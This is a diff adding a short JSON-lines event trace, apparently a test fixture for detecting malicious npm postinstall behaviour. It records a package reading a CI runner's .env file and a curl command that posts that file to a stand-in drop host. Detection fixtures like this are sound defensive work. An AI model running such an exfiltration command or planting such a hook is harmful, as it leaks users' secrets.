@@ -1,0 +1,5 @@
+{"type":"exec","ts":1000000000,"pid":100,"ppid":1,"comm":"node","cwd":"/repo/node_modules/malicious-pkg","cmdline":"node postinstall.js"}
+{"type":"open","ts":1001000000,"pid":100,"ppid":1,"comm":"node","path":"/home/runner/work/repo/.env"}
+{"type":"exec","ts":1002000000,"pid":101,"ppid":100,"comm":"sh","cwd":"/repo/node_modules/malicious-pkg","cmdline":"sh -c curl -X POST -d @.env https://api.drop.example"}
+{"type":"exec","ts":1003000000,"pid":102,"ppid":101,"comm":"curl","cwd":"/repo/node_modules/malicious-pkg","cmdline":"curl -X POST -d @.env https://api.drop.example"}
+{"type":"connect","ts":1044000000,"pid":102,"ppid":101,"comm":"curl","dest":"93.184.216.34:443"}
